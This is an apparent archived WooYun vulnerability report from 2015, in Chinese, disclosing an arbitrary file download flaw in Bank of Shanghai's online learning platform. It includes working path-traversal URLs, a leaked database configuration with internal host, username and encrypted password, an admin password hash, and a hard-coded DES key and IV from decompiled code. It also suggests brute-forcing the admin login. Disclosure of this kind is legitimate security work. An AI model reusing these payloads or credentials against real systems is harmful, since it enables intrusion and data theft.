{"id": 66317, "wybug_id": "wooyun-2015-0139740", "wybug_title": "上海银行某系统任意文件下载导致敏感信息泄露", "wybug_corp": "上海银行", "wybug_author": "路人甲", "wybug_date": "2015-09-08 15:36", "wybug_open_date": "2015-10-26 17:34", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["服务配置不当", "任意文件遍历下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向公众公开  简要描述：  详细说明：  详细说明见漏洞证明。   漏洞证明：  上海银行网上学习平台（系统URL地址：http://learning.bankofshanghai.com/）存在任意文件下载漏洞，导致敏感信息泄露。系统首页为，确定上海银行系统\n\n举例说明：1.直接访问如下URL，下载wis18.jar包http://learning.bankofshanghai.com/wis18/file.showimage.flow?filename=../WEB-INF/lib/wis18.jar\n\n可以对该jar包进行反编译获取源代码。2.数据库配置文件下载,直接访问如下URLhttp://learning.bankofshanghai.com/wis18/file.showimage.flow?filename=../system/config/ds.xml包含数据库主机IP、用户名、密码等\n<?xml version=\"1.0\" encoding=\"utf-8\"?><datasource>   <db>oracle</db>    <flag>1</flag>    <ip>11.1.21.20</ip>    <port>1521</port>    <databasename>boslearn</databasename>    <connection-url>jdbc:oracle:thin:@11.1.21.20:1521:boslearn</connection-url>    <driver-class>oracle.jdbc.driver.OracleDriver</driver-class>    <username>boslearn</username>    <password>{DES}mwHgQpaA/2LKq5ZGRFXbAQ==</password>    <idleconnectiontestperiod>60</idleconnectiontestperiod>    <idlemaxage>240</idlemaxage>    <minconnectionsperpartition>5</minconnectionsperpartition>    <maxconnectionsperpartition>10</maxconnectionsperpartition>    <partitioncount>1</partitioncount>    <acquireincrement>10</acquireincrement>    <preparedstatementcachesize>100</preparedstatementcachesize>    <statementscachedperconnection>30</statementscachedperconnection>    <releasehelperthreads>3</releasehelperthreads>    <initsql>select * from dual</initsql> </datasource>\n3.管理员配置文件，用户名admin，密码是DES加密的http://learning.bankofshanghai.com/wis18/file.showimage.flow?filename=../system/config/manauser.xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?><system>   <username>admin</username>    <password>{DES}XbFZLpK0+6I=</password> </system>\n该系统使用了DES加密，经过一番寻找，在jar包反编译后的com\\wis18\\core\\util目录中找到了EncryptAndDecrypt.java文件，该文件该文件包含秘钥strDesKey\npublic static void main(String[] args) {    try {       System.out.println(desEncrypt(\"的发生地\"));      System.out.println(desEncrypt(\"的的的\"));      System.out.println(desEncrypt(\"的的\"));       System.out.println(desEncrypt(\"的\"));       }    catch (Exception ex)      {        ex.printStackTrace();      }  }  static {   try    {      encipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");      decipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");      String strDesKey = \"Wis@1/-GOod=\";      String strDesIV = \"No1&>AllSys=\";       BASE64Decoder b = new BASE64Decoder();      desKeySpec = new DESKeySpec(b.decodeBuffer(strDesKey));      SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"DES\");      secretKey = keyFactory.generateSecret(desKeySpec);      iv = new IvParameterSpec(b.decodeBuffer(strDesIV));      encipher.init(1, secretKey, iv);      decipher.init(2, secretKey, iv);      } catch (Exception e) {     e.printStackTrace();    }  }}\n有了秘钥是不是可以去破解下后台管理员的密码呢，试了下了没解密成功，但是经过测试该系统后台登录无验证，当然可以试试暴力破解了。但该系统后台登录地址为：http://learning.bankofshanghai.com/wis18/login/manalogin.jsp\n\nOK，问题证明到此。   修复方案：  你们是行家。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-09-11 17:33 厂商回复： 已修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-26 18:40 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1115 漏洞数:306        | 通　　　　　　　　　　　　　　　　　　　...)\t\t \n   WooYun: 新风向通用考试平台影响金融/IT/电力通讯/教育/等行业（多家银行、证券企业）  问题就来了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}